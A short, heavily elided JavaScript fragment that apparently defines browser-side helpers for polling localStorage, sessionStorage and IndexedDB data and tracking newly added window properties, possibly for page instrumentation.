(() => {
	...
	window.getIndexedDBData = async function() {
	...
	window.__pollStorage = async function (stage = "poll") {
		try {
			let localStorageData = {};
			let sessionStorageData = {};

			if (indexedDB.databases !== undefined && chrome !== undefined) {
				await window.getIndexedDBData()
					.then((result) => {
						return result;
					})
					.then((totalDBData) => {
			...
			for (let prop of Object.getOwnPropertyNames(window)) {
				if (window.__seenVars.has(prop)) continue;
				try {
